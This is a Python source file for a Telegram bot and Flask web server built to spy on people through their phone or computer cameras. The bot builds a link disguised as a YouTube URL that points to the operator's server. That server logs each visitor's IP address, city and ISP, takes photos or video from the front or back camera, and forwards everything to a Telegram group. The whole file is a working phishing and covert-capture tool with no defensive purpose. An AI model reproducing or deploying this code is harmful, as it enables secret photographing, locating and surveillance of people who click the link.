import os
import telebot
from flask import Flask, render_template, request
import threading
import io
import time

# --- CONFIG ---
TOKEN = os.environ.get('TOKEN')
BASE_URL = os.environ.get('BASE_URL') 
GROUP_ID = os.environ.get('GROUP_ID') 

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# Temporary storage for user data and photo buffering
user_temp = {}
# collection structure: { "user_id": { "photos": [], "info": "" } }
collection = {}

# --- TELEGRAM BOT LOGIC ---

@bot.message_handler(commands=['start'])
def start(message):
    uid = message.chat.id
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add("🤳 Front Cam", "📷 Back Cam")
    bot.send_message(uid, "✅ Verification System Active.\nSelect camera to use for the link:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text in ["🤳 Front Cam", "📷 Back Cam"])
def set_cam(message):
    uid = message.chat.id
    cam = "user" if "Front" in message.text else "environment"
    user_temp[uid] = {'cam': cam}
    
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add("📸 8 Photos", "🎥 3s Video")
    msg = bot.send_message(uid, "Now choose capture mode:", reply_markup=markup)
    bot.register_next_step_handler(msg, set_mode)

def set_mode(message):
    uid = message.chat.id
    mode = "photo" if "Photos" in message.text else "video"
    if uid in user_temp:
        user_temp[uid]['mode'] = mode
    else:
        user_temp[uid] = {'cam': 'user', 'mode': mode}
    
    msg = bot.send_message(uid, "Enter a YouTube Video ID (or type 'default'):")
    bot.register_next_step_handler(msg, make_link)

def make_link(message):
    uid = message.chat.id
    yt_id = message.text if message.text.lower() != 'default' else 'dQw4w9WgXcQ'
    data = user_temp.get(uid, {'cam': 'user', 'mode': 'photo'})
    
    real_link = f"{BASE_URL}/?id={uid}&mode={data['mode']}&cam={data['cam']}&ytid={yt_id}"
    fake_display = f"https://youtu.be/{yt_id}?si=Status_Verified"
    
    bot.send_message(
        uid, 
        f"🚀 **Link Ready!**\n\nTarget Link: [{fake_display}]({real_link})", 
        parse_mode="Markdown", 
        disable_web_page_preview=True
    )

# --- WEB SERVER LOGIC ---

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/log_info', methods=['POST'])
def log_info():
    data = request.json
    tid = request.args.get('id')
    
    info_text = (f"📍 **Device Logged**\n"
                 f"ID: `{tid}`\n"
                 f"IP: `{data.get('ip')}`\n"
                 f"City: {data.get('city')}\n"
                 f"ISP: {data.get('org')}")
    
    if tid not in collection:
        collection[tid] = {"photos": [], "info": info_text}
    else:
        collection[tid]["info"] = info_text
        
    return "OK"

@app.route('/upload', methods=['POST'])
def upload():
    tid = request.args.get('id')
    ftype = request.args.get('type')
    file_bytes = request.files['file'].read()

    if tid not in collection:
        collection[tid] = {"photos": [], "info": f"ID: `{tid}`\n(No IP Data Received)"}

    # Handle Video immediately
    if ftype == 'video':
        try:
            bot.send_video(GROUP_ID, io.BytesIO(file_bytes), caption=collection[tid]["info"], parse_mode="Markdown")
        except Exception as e:
            print(f"Video Error: {e}")
        return "OK"

    # Handle Photo buffering
    collection[tid]["photos"].append(file_bytes)

    # When 8 photos are gathered, send them as one album
    if len(collection[tid]["photos"]) >= 8:
        media_group = []
        for i, p_bytes in enumerate(collection[tid]["photos"]):
            # Attach the device info to the caption of the first photo in the album
            caption = collection[tid]["info"] if i == 0 else ""
            media_group.append(telebot.types.InputMediaPhoto(p_bytes, caption=caption, parse_mode="Markdown"))
        
        try:
            bot.send_media_group(GROUP_ID, media_group)
        except Exception as e:
            print(f"Album Send Error: {e}")
            
        # Clean up storage for this user session
        del collection[tid]

    return "OK"

# --- RUNNER WITH 409 CONFLICT FIX ---

def run_bot():
    while True:
        try:
            print("Cleaning old sessions and starting bot...")
            bot.remove_webhook()
            time.sleep(1)
            bot.infinity_polling(timeout=20, long_polling_timeout=10)
        except Exception as e:
            print(f"Bot Polling Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    # Start bot thread
    threading.Thread(target=run_bot, daemon=True).start()
    
    # Start Flask server
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
